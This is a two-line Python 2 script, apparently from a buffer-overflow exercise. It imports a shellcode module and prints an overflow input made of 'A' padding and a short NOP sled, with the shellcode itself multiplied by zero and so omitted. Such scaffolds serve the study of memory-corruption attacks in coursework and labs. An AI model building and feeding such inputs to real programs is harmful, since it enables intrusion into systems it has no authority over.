from shellcode import shellcode

print "A" * 15 + "\x90" * 2 + shellcode * 0
